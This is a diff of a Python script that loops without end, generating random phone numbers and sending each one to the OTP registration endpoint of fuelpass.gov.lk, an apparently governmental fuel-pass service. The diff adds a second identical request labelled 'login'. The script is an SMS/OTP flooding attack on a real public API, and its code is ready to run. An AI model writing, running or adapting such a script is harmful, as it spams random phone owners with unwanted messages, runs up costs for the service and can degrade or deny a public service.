@@ -22,9 +22,14 @@ rowCount = 0;
 while(True):
     rowCount += 1;
     randomNum = random_with_N_digits(7)
-    url = 'http://fuelpass.gov.lk/api/otp/registration'
-    myobj = {'mobileNo': concat(0, randomNum)}
-    x = requests.post(url, json = myobj)
-    print("a",x)
-    print("b",x.text)
-    print (rowCount, concat(0, randomNum))
+    
+    regigsterUrl = 'https://fuelpass.gov.lk/api/otp/registration'
+    registeredObject = {'mobileNo': concat(0, randomNum)}
+    x = requests.post(regigsterUrl, json = registeredObject)
+
+    print ("register",rowCount, concat(0, randomNum), x.text, x)
+
+    loginUrl = 'https://fuelpass.gov.lk/api/otp/registration'
+    loginObject = {'mobileNo': concat(0, randomNum)}
+    y = requests.post(loginUrl, json = loginObject)
+    print ("login",rowCount, concat(0, randomNum), y.text, y)
